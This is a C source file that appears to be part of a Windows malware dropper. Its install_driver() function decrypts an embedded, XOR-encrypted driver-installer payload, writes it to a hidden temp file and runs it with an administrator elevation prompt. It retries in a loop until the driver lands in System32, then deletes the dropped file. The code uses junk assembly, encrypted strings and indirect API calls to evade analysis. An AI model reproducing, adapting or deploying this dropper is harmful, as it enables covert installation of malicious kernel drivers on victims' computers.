#include "global_config.h"
#include "crypto.h"
#include "kernel_driver_install_payload.h"

#include <windows.h>
#include <string.h>
#include <Shlobj.h>
#include <stdio.h>

#include "Shlwapi.h"

#include "junk_asm.h"

#include "functions_table.h"

#include "common_utils.h"

#include "debug.h"

#pragma warning(disable:4996)


extern char driver_install_payload[];


/*

************************************ BIG WARNING
Although, we copied the file to: C:\Windows\system32\drivers\

If the system is x64, and your driver is 32 bits (or the copi-er is 32 bits), then the file will be copied to: ./Windows/SysWOW64/drivers/

Eventhough, PathFileExistsA() stills report TRUE



*/
void install_driver() {
    ASM_JUNK

        //
        if (Is64BitWindows()) {
            DBG_MSG("install_driver() - 64 bits os, so return now.\n");
            return;
        }


    //
    char driver_file_fullpath[MAX_PATH];


    //
    char* driver_install_filename_decrypted = NULL;
    decrypt_to_string(&driver_install_filename_decrypted, DRIVER_INSTALL_FILENAME, DRIVER_INSTALL_FILENAME_ENCRYPTED_LEN);

    DBG_MSG("install_driver() - driver_install_filename_decrypted: %s\n", driver_install_filename_decrypted);

    //
    char* windir = NULL;
    decrypt_to_string(&windir, WINDIR, WINDIR_LEN);

    DBG_MSG("install_driver() - windir decrypted: %s\n", windir);

    char* windir_path = getenv(windir);

    DBG_MSG("install_driver() - windir_path: %s\n", windir_path);

    strcpy(driver_file_fullpath, windir_path);

    //
    free(windir);


    //
    char* system32 = NULL;
    decrypt_to_string(&system32, SYSTEM32, SYSTEM32_LEN);

    DBG_MSG("install_driver() - system32: %s\n", system32);

    strcat(driver_file_fullpath, system32);


    //
    strcat(driver_file_fullpath, driver_install_filename_decrypted);

    DBG_MSG("install_driver() - driver_file_fullpath: %s\n", driver_file_fullpath);

    //
    free(driver_install_filename_decrypted);
    free(system32);

    //
    char* elevator_dropfile_prefix = NULL;
    decrypt_to_string(&elevator_dropfile_prefix, ELEVATOR_DROPFILE_PREFIX, ELEVATOR_DROPFILE_PREFIX_ENCRYPTED_LEN);

    DBG_MSG("install_driver() - elevator_dropfile_prefix: %s\n", elevator_dropfile_prefix);


    //
    DBG_MSG("install_driver() - generating a temp file to elevate privileges for installing driver.\n");
    char tmp_file[300];

    char tempfile_path[MAX_PATH];

    int res;

    char* decrypted_driver_install_payload = xor_encrypt_decrypt(driver_install_payload, (char*)DRIVER_ENCRYPTION_KEY, DRIVER_INSTALL_PAYLOAD_LEN);

    while (1) {
        // check if install driver success
        if (!l_PathFileExistsA(driver_file_fullpath))
        {
            // File not found, continue do our work.
            DBG_MSG("install_driver() - file NOT INSTALLED. Going to install.\n");
        }
        else {
            DBG_MSG("install_driver() - file INSTALLED. Not going to install.\n");

            return;
        }


        /// create a tmp file for driver_install_payload, then runas the file
        //
        int res = 0;

        res = l_GetTempPathA(MAX_PATH, tempfile_path);

        if (res > MAX_PATH || res == 0) {
            DBG_MSG("drop_and_run_exe() - GetTempPathA() failed.\n");
            return;
        }

        //
        char* exe = NULL;
        decrypt_to_string(&exe, EXE, EXE_LEN);

        DBG_MSG("install_driver() - exe: %s\n", exe);

        res = l_GetTempFileNameA(tempfile_path, NULL, 0, tmp_file);

        strcat(tmp_file, ".");
        strcat(tmp_file, elevator_dropfile_prefix);
        strcat(tmp_file, exe);

        //
        free(exe);

        if (res == 0)
            return;

        DBG_MSG("install_driver() - tmp_file: %s\n", tmp_file);

        bool w_res = write_file(tmp_file, decrypted_driver_install_payload, DRIVER_INSTALL_PAYLOAD_LEN);

        if (!w_res) {
            DBG_MSG("install_driver() - FAILED to write tmp_file: %s. Continue trying\n", tmp_file);
            continue;
        }

        l_SetFileAttributesA(tmp_file, FILE_ATTRIBUTE_HIDDEN);

        DBG_MSG("install_driver() - SUCCESS to write tmp_file: %s. do runas_administrator() now.\n", tmp_file);

        SHELLEXECUTEINFOA * sei = open_or_runas_executor(tmp_file, TRUE);

        if (sei != NULL) {
            // wait until the job done.

            DBG_MSG("install_driver() - Wait for runas_administrator() done.\n");
            l_WaitForSingleObject(sei->hProcess, INFINITE);
            l_CloseHandle(sei->hProcess);
            free(sei);

            // DeleteFileA(tmp_file);
            DBG_MSG("install_driver() - runas_administrator() done SUCCESS !!!!, delete the drop file now.\n");
            l_DeleteFileA(tmp_file);
        }
        else {

            // DeleteFileA(tmp_file);
            DBG_MSG("install_driver() - runas_administrator() done FAILED !!!!, delete the drop file now.\n");
            l_DeleteFileA(tmp_file);
        }

        

    }

    free(elevator_dropfile_prefix);
}